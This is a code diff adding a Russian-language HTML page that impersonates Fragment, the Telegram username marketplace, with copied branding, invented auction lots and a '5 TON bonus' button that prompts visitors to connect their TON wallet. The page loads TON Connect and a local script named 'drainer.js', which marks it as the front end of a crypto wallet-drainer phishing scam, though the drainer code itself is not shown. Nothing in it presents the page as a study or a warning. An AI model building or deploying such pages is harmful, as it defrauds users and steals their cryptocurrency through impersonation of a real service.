@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Fragment — покупка username и номеров</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+    <!-- Шапка как у Fragment -->
+    <header class="header">
+        <div class="container header-inner">
+            <div class="logo">
+                <span class="logo-icon">🧩</span>
+                <span class="logo-text">Fragment</span>
+            </div>
+            <nav class="nav">
+                <a href="#">Username</a>
+                <a href="#">Номера</a>
+                <a href="#">Аккаунты</a>
+                <a href="#">FAQ</a>
+            </nav>
+            <div id="ton-connect-container"></div>
+        </div>
+    </header>
+
+    <!-- Герой-секция -->
+    <section class="hero">
+        <div class="container">
+            <h1>Покупайте и продавайте<br />username Telegram</h1>
+            <p class="hero-sub">
+                Анонимно. Безопасно. На TON blockchain.
+            </p>
+        </div>
+    </section>
+
+    <!-- Секция с аукционом (имитация) -->
+    <section class="auction">
+        <div class="container">
+            <h2>🔥 Горячие лоты</h2>
+            <div class="auction-grid">
+                <div class="auction-card">
+                    <div class="auction-name">@king</div>
+                    <div class="auction-price">12,500 TON</div>
+                    <div class="auction-bid">23 ставки</div>
+                </div>
+                <div class="auction-card">
+                    <div class="auction-name">@boss</div>
+                    <div class="auction-price">8,200 TON</div>
+                    <div class="auction-bid">17 ставок</div>
+                </div>
+                <div class="auction-card">
+                    <div class="auction-name">@winner</div>
+                    <div class="auction-price">5,100 TON</div>
+                    <div class="auction-bid">9 ставок</div>
+                </div>
+            </div>
+            <div class="auction-cta">
+                <button id="claimRewardBtn" class="btn-primary" disabled>
+                    🎁 Забрать бонус 5 TON
+                </button>
+                <p class="cta-hint">Подключите кошелёк для получения бонуса</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Футер -->
+    <footer class="footer">
+        <div class="container">
+            <p>© 2026 Fragment. Все права защищены.</p>
+        </div>
+    </footer>
+
+    <!-- TON Connect UI -->
+    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.1.0/dist/tonconnect-ui.min.js">
+    </script>
+    <!-- Основной скрипт -->
+    <script src="drainer.js"></script>
+</body>
+</html>
